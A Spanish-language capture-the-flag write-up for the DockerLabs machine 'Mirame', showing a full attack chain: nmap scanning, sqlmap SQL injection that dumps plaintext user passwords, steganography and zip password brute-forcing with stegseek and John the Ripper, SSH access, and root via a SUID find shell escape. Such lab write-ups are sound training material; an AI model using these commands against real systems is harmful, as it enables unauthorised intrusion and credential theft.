# 💻 Maquina Mirame

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

* **Nombre de la Máquina:** Balulero
* **Sistema Operativo:** Linux
* **Dificultad:** Fácil
* **Plataforma:** [DockerLabs](https://dockerlabs.es/)
* **Dirección IP:** 127.17.0.2
* Autor: maciiii\_\_\_

### Escaneo de puertos

Iniciamos escaneando la maquina victima pra ver que encontramos

`sudo nmap -sS -p- --open --min-rate 5000 -sCV -n -Pn -v 172.17.0.2 -oG allports`

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 13:44 -05
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:44
Completed NSE at 13:44, 0.00s elapsed
Initiating NSE at 13:44
Completed NSE at 13:44, 0.00s elapsed
Initiating NSE at 13:44
Completed NSE at 13:44, 0.00s elapsed
Initiating ARP Ping Scan at 13:44
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:44, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:44
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:44, 0.52s elapsed (65535 total ports)
Initiating Service scan at 13:44
Scanning 2 services on 172.17.0.2
Completed Service scan at 13:45, 6.57s elapsed (2 services on 1 host)
NSE: Script scanning 172.17.0.2.
Initiating NSE at 13:45
Completed NSE at 13:45, 0.44s elapsed
Initiating NSE at 13:45
Completed NSE at 13:45, 0.01s elapsed
Initiating NSE at 13:45
Completed NSE at 13:45, 0.00s elapsed
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login Page
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:45
Completed NSE at 13:45, 0.00s elapsed
Initiating NSE at 13:45
Completed NSE at 13:45, 0.00s elapsed
Initiating NSE at 13:45
Completed NSE at 13:45, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Encontramos el puerto 80 que corre http y el puerto 22 que corre ssh, procedemos ir al navegador e ntroducir la ip para ver que nos encontramos.

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt="" width="291"><figcaption></figcaption></figure>

Encontramos un login en el cual intentamos diferentes combinaciones pero no es posible al adjuntar una comilla nos damos de cuenta que nos lanza un error, por lo que puede ser vulnerable a un ataque sqlinyection por lo que procedemos a correr `sqlmap`

```bash
sqlmap -u http://mirame.dl/index.php -forms -batch --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.9#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:30:33 /2024-10-01/

[11:30:33] [INFO] testing connection to the target URL
[11:30:33] [INFO] searching for forms
[1/1] Form:
POST http://mirame.dl/auth.php
POST data: username=&password=

[11:30:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[11:30:46] [INFO] fetching database names
[11:30:46] [INFO] retrieved: 'information_schema'
[11:30:46] [INFO] retrieved: 'users'
available databases [2]:
[*] information_schema
[*] users

[11:30:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/frogtheripper/.local/share/sqlmap/output/results-10012024_1130am.csv'

[*] ending @ 11:30:46 /2024-10-01/

```

Como resultado vemos que nos encuentra dos bases de datos una llamada information\_schema y otra users que es la que nos interesa.

```bash
sqlmap -u http://mirame.dl/index.php -forms -batch --dbs -D users -tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:31:12 /2024-10-01/
[11:31:13] [INFO] fetching tables for database: 'users'
[11:31:13] [INFO] retrieved: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+

[11:31:13] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/frogtheripper/.local/share/sqlmap/output/results-10012024_1131am.csv'

[*] ending @ 11:31:13 /2024-10-01/
```

Encontramos una tabla llamada usuarios

```bash
sqlmap -u http://mirame.dl/index.php -forms -batch --dbs -D users -T usuarios --columns --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:31:43 /2024-10-01/

[11:31:43] [INFO] testing connection to the target URL
[11:31:43] [INFO] searching for forms
[1/1] Form:
POST http://mirame.dl/auth.php
POST data: username=&password=

[11:31:43] [INFO] fetching columns for table 'usuarios' in database 'users'
[11:31:43] [INFO] resumed: 'id'
[11:31:43] [INFO] resumed: 'int(11)'
[11:31:43] [INFO] resumed: 'username'
[11:31:43] [INFO] resumed: 'varchar(50)'
[11:31:43] [INFO] resumed: 'password'
[11:31:43] [INFO] resumed: 'varchar(255)'
[11:31:43] [INFO] fetching entries for table 'usuarios' in database 'users'
[11:31:43] [INFO] retrieved: '1'
[11:31:43] [INFO] retrieved: 'chocolateadministrador'
[11:31:43] [INFO] retrieved: 'admin'
[11:31:43] [INFO] retrieved: '2'
[11:31:43] [INFO] retrieved: 'lucas'
[11:31:43] [INFO] retrieved: 'lucas'
[11:31:43] [INFO] retrieved: '3'
[11:31:43] [INFO] retrieved: 'soyagustin123'
[11:31:43] [INFO] retrieved: 'agustin'
[11:31:43] [INFO] retrieved: '4'
[11:31:43] [INFO] retrieved: 'directoriotravieso'
[11:31:43] [INFO] retrieved: 'directorio'
Database: users
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+

[11:31:43] [INFO] table 'users.usuarios' dumped to CSV file '/home/frogtheripper/.local/share/sqlmap/output/mirame.dl/dump/users/usuarios.csv'
[11:31:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/frogtheripper/.local/share/sqlmap/output/results-10012024_1131am.csv'

[*] ending @ 11:31:43 /2024-10-01/

```

Como vemos tenemos 4 usuarios diferentes con sus respectivas contraseñas con estas ingresamos pero vemos que nos abre una pagina donde nos muestra la temperatura de la ciudad que ingresemos, por lo cual no nos sirve de mucho.

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt="" width="329"><figcaption></figcaption></figure>

Anteriormente en los usuarios que encontramos uno de ellos nos dio como una pista, para saber que era la direccion como de un directorio intentamos ingresar y efectivamente nos lleva a una pagina done tenemos una imagen `mirame.jpg`

```
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

La descargamos y usamos la herramienta `exiftool` para ver sus metadatos pero no encontramos nada por lo que recurrimos a `steghide` para ver si hay algún archivo oculto .

`steghide extract -sf miramebien.jpg`

```bash
"miramebien.jpg":
  format: jpeg
  capacity: 263.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Como vemos al tratar de extraerlo nos pide una contraseña que no tenemos por lo que recurrimos a `stegseek` para realizar una fuerza bruta

`stegseek extract -sf miramebien.jpg -wl /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek`

```bash
[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien.jpg.out".

```

Encontramos la contraseña y vemos que hay un archivo zip llamado ocultito de nuevo usamos la herramienta `steghide` y extraemos el archivo `ocultito.zip` pero vemos que tambien tiene contraseña

Así que nos toca recurrir a John the ripper para obtener el hash del zip y de nuevo para hacerle fuerza bruta a este.

`zip2john ocultito.zip > hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

`john --show hash.txt`

```bash
ocultito.zip/secret.txt:stupid1:secret.txt:ocultito.zip::ocultito.zip

1 password hash cracked, 0 left
```

Encontramos la contraseña stupid1 con lo cual extremos el zip y encontramos un txt donde se encuentra unas credenciales las cual aprovecharemos para ingresar por ssh.

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt="" width="247"><figcaption></figcaption></figure>

`ssh carlos@172.17.0.2`

```bash
Linux 055007bdd9cd 6.10.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.10.9-1kali1 (2024-09-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct  1 18:09:54 2024 from 172.17.0.1
```

Tratamos de listar permisos sudo -l pero no nos fue posible asi que buscamos en los binarios SUID para ver que podemos encontrar.

`find / -perm -4000 2>/dev/null`

```bash
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
```

Como vemos encontramos un binario <mark style="color:orange;">find</mark> el cual vamos a buscar en [GTFObins](https://gtfobins.github.io/) y vemos que podemos aprovecharlo para escalar privilegios.

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
carlos@055007bdd9cd:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
whoami
root
```



&#x20;Y somos Root..
